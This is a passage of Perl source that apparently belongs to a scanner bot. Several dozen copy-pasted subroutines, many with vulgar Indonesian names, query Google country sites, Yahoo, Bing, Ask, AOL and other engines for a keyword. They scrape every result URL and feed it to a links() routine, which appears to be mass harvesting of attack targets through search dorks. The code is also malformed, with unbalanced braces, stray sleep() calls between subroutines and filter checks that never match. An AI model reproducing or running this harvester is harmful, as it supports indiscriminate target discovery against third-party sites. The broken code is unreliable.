    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack3.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack4() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack4.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack5() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack5.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack6() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack6.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack7() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack7.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack8() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack8.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack9() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack9.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack10() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack10.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack11() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack11.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack12() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack12.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack13() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack13.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack14() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack14.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack15() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack15.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack16() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack16.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack17() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack17.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack18() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack18.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack19() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack19.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub jack20() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ($jack20.uri_escape($key)."&num=100&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub kontol() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com/search?q=".uri_escape($key)."&num=100&filter=0&start=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub pepek() {
	my @list;
	my $key = $_[0];
	for ($b=0; $b<=100; $b+=1) {
        my $search = ("http://search.walla.co.il/?q=".uri_escape($key)."&type=text&page=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title=/g) {
            my $link = $1;
            if ($link !~ /walla\.co\.il/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub tetek(){
    my @list;
	my $key = $_[0];
	for ($b=1; $b<=1000; $b+=10) {
        my $search = ("http://search.yahoo.com/search?p=".uri_escape($key)."&b=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\"/g) {
            my $link = $1;
            if ($link !~ /yahoo\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub itil() {
	my @list;
	my $key = $_[0];
	for (my $i=1; $i<=1000; $i+=100) {
		my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=1&frstpgo=0&o=0&l=dir&qid=05D10861868F8C7817DAE9A6B4D30795&page=".$i."&jss=");
		my $res = search_engine_query($search);
		while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {
            my $link = $1;
			if ($link !~ /ask\.com/){
				my @grep = links($link);
				push(@list,@grep);
			}
		}
	}
	return @list;
}

sub nennen() {
	my @list;
	my $key = $_[0];
	my $b   = 0;
	for ($b=1; $b<=400; $b+=10) {
		my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".uri_escape($key));
		my $res = search_engine_query($search);
		while ($res =~ m/<a href=\"http:\/\/(.*?)\">/g) {
			my $link = $1;
			if ($link !~ /onet|webcache|query/){
				my @grep = links($link);
                push(@list,@grep);
			}
		}
	}
	return @list;
}

sub susu() {
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=10; $b<=200; $b+=10) {
        my $search = ("http://search.yippy.com/search?input-form=clusty-simple&v%3Asources=webplus-ns-aaf&v%3Aproject=clusty&query=".uri_escape($key)."&v:state=root|root-".$b."-20|0&");
        my $res = search_engine_query($search);
		if ($res !~ /next/) {$b=100;}
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($1 !~ /yippy\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub buahdada() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=400; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&first=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {
			my $link = $1;
            if ($link !~ /google/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub payudara(){
    my @list;
	my $key = $_[0];
	for ($b=1; $b<=50; $b+=1) {
        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".uri_escape($key)."&st=local");
        my $res = search_engine_query($search);
		if ($res !~ m/Next/i) {$b=50;}
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($1 !~ /\.sapo\.pt/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub kentot() { 
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://search.lycos.com/web?q=".uri_escape($key)."&pn=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/title=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link !~ /lycos\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}

sub emel() {
	my @list;
	my $key = $_[0];
    for ($b=0; $b<=1000; $b+=10) {
        my $search = ("http://busca.uol.com.br/web/?ref=homeuol&q=".uri_escape($key)."&start=".$b);
        my $res = search_engine_query($search);
		if ($res =~ m/retornou nenhum resultado/i) {$b=500;}
        while ($res =~ m/href=\"?http:\/\/([^\">]*)\"/g) {
            my $link = $1;
            if ($link !~ /uol\.com\.br|\/web/i){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub oral() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=50; $b+=1) {
        my $search = ("http://www.hotbot.com/search/web?pn=".$b."&q=".uri_escape($key));
        my $res = search_engine_query($search);
		if ($res =~ m/had no web result/i) {$b=50;}
        while ($res =~ m/href=\"http:\/\/(.+?)\" title=/g) {
            my $link = $1;
            if ($link !~ /hotbot\.com/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}

sub klitoris() {
	my @list;
	my $key = $_[0];
	for ($b=0; $b<=300; $b+=10) {
		my $search = ("http://search.aol.com/aol/search?q=".uri_escape($key)."&page=".$b);
		my $res = search_engine_query($search);
		while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
			my $link = $1;
			if ($link !~ /aol\.com/){
				my @grep = links($link);
				push(@list,@grep);
			}
		}
	}
	return @list;
}

sub masturbasi() {
  my $key = $_[0];
  my @list;
  for ($b=1; $b<=500; $b+=10) {
    $num += $num;
    my $search = "http://cgi.search.biglobe.ne.jp/cgi-bin/search-st_lp2?start=".$b."&ie=utf8&num=".$num."&q=".uri_escape($key)."&lr=all";
    my $res = search_engine_query($search);
    while ( $res =~ m/<a href=\"http:\/\/(.+?)\"/g ) {
	    my $link = $1;
        if ($link !~ /biglobe/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub onani() {
  my @list;
  my $key = $_[0];
  my $b	  = 0;
  my @doms = ("nl","au","br","ca","de","es","fr","it","uk");
  foreach my $domain (@doms) { #$dom = $doms[rand(scalar(@doms))];
    for (my $i=1; $i<=1000; $i+=100) {
        my $search = ("http://".$domain.".search.yahoo.com/search?n=100&p=".uri_escape($key)."&b=".$i);
        my $res = search_engine_query($search);
        while ($res =~ m/http\%3a\/\/(.+?)\//g) {
            if ($1 !~ /yahoo\.com/){ my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = links($link); push(@list,@grep);
            }
        }
    } return @list;
}

sub sperma() {
    my @list;
    my $key = $_[0];
    for (my $i=10; $i<=1000; $i+=100){
        my $search = ("http://www.kvasir.no/nettsok?q=".$i."&pageSize=100&q=".uri_escape($key)."");
        my $res = search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\//g) {
            my $link = $1; if ($link !~ /kvasir/){ $link =~ s/<//g; $link =~ s/ //g; my @grep = links($link); push(@list,@grep);
            }
        }
    }
    return @list;
} 

sub anal() {
    my @lst;
    my $key = $_[0];
    for (my $i=0; $i<=50; $i+=1){
        my $search = ("http://quintura.com/?request=".uri_escape($key)."&tab=0&page=".$i."&tabid=");
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/(.+?)\//g) {
            my $link = $1;
            if ($link !~ /quintura/){
                my @grep = links($link);
                push(@lst,@grep);
            }
        }
    }
    return @lst;
}		
		
sub puting() {
    my @list;
    my $key = $_[0];
    for ($b=1; $b<=1000; $b+=100) {
        my $search = ("http://search.seznam.cz/?q=".uri_escape($key)."&count=10&pId=SkYLl2GXwV0CZZUQcglt&from=".$b);
        my $res = search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.+?)\" title/g) {
            if ($1 !~ /seznam/){
            my $link = $1;
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub vagina(){
    my @list;
    my $key = $_[0];
    my $i   = 0;
    for ($i=0; $i<=100; $i+=1){
        my $web=("http://startgoogle.startpagina.nl/index.php?q=".uri_escape($key)."&start=".$i."&origin=homepage&source=geentaal");		
        my $Res= search_engine_query($web);
        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
            if ($1 !~ /pagina|pagina's/){
                my $k=$1;
                my @grep=links($k);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub penis(){
	my @list;
	my $key = $_[0];
	for($b=1;$b<=1000;$b+=100){
		my $Th=("http://www.google.pt/search?q=".uri_escape($key)."&in=Mundial&num=25&ckWhere=Mundo&position=".$b."");
		my $Res=search_engine_query($Th);
		while($Res =~ m/href=\"http:\/\/(.+?)\//g){
			my $link = $1; $link =~ s/<//g; $link =~ s/ //g; my @grep = links($link); push(@list,@grep);
		}
	}
return @list;
}

sub memek() {
  my @list;
    my $key = $_[0];
    for (my $i=1; $i<=50; $i+=1) {
        my $search = ("http://it.ask.com/web?q=".uri_escape($key)."&qsrc=0&o=0&l=dir&qid=EE90DE6E8F5370F363A63EC61228D4FE&page=".$i."&jss=1&dm=all");
        my $res = search_engine_query($search);
		if ($res !~ /Successiva/) {$i=50;}
        while ($res =~ m/href=\"http:\/\/(.+?)\" onmousedown=\"/g) {
            if ($1 !~ /ask\.com/){
            my $link = $1;
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
}
sub googleCA() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.ca/search?q=".uri_escape($key)."&hl=&cr=countryCA&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCA/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleDE() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.de/search?q=".uri_escape($key)."&hl=&cr=countryDE&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleDE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleUK() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.uk/search?q=".uri_escape($key)."&hl=&cr=countryUK&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleUK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleFR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.fr/search?q=".uri_escape($key)."&hl=&cr=countryFR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleFR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleES() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.es/search?q=".uri_escape($key)."&hl=&cr=countryES&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleES/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleIT() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.it/search?q=".uri_escape($key)."&hl=&cr=countryIT&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleIT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(1);
sub googleNL() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.nl/search?q=".uri_escape($key)."&hl=&cr=countryNL&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleNL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleBE() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.be/search?q=".uri_escape($key)."&hl=&cr=countryBE&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleBE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCH() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.ch/search?q=".uri_escape($key)."&hl=&cr=countryCH&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCH/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(1);
sub googleSE() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.se/search?q=".uri_escape($key)."&hl=&cr=countrySE&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleSE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleDK() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.dk/search?q=".uri_escape($key)."&hl=&cr=countryDK&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleDK/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleNO() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.no/search?q=".uri_escape($key)."&hl=&cr=countryNO&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleNO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(1);
sub googleNZ() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.nz/search?q=".uri_escape($key)."&hl=&cr=countryNZ&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleNZ/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleIE() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.ie/search?q=".uri_escape($key)."&hl=&cr=countryIE&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleIE/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleBR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.br/search?q=".uri_escape($key)."&hl=&cr=countryBR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /google/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(2);
sub googleAR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.ar/search?q=".uri_escape($key)."&hl=&cr=countryAR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleAR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCO() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.co/search?q=".uri_escape($key)."&hl=&cr=countryCO&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCO/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleCU() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.cu/search?q=".uri_escape($key)."&hl=&cr=countryCU&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(2);
sub googleCL() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.cl/search?q=".uri_escape($key)."&hl=&cr=countryCL&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleCL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleMX() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.mx/search?q=".uri_escape($key)."&hl=&cr=countryMX&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleMX/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleAU() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.au/search?q=".uri_escape($key)."&hl=&cr=countryAU&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleAU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(2);
sub googleRU() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.ru/search?q=".uri_escape($key)."&hl=&cr=countryRU&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleRU/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleAT() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.at/search?q=".uri_escape($key)."&hl=&cr=countryAT&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleAT/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googlePL() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.pl/search?q=".uri_escape($key)."&hl=&cr=countryPL&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googlePL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleIL() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.co.il/search?q=".uri_escape($key)."&hl=&cr=countryIL&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleIL/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleTR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.tr/search?q=".uri_escape($key)."&hl=&cr=countryTR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleTR/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub googleUA() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.com.ua/search?q=".uri_escape($key)."&hl=&cr=countryUA&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {
            my $link = $1;
            if ($link !~ /googleUA/){
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
sleep(3);
sub googleGR() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=1000; $i+=100){
        my $search = ("http://www.google.gr/search?q=".uri_escape($key)."&hl=&cr=countryGR&as_qdr=&num=100&filter=&start=".$i."&sa=N");
        my $res = &search_engine_query($search);
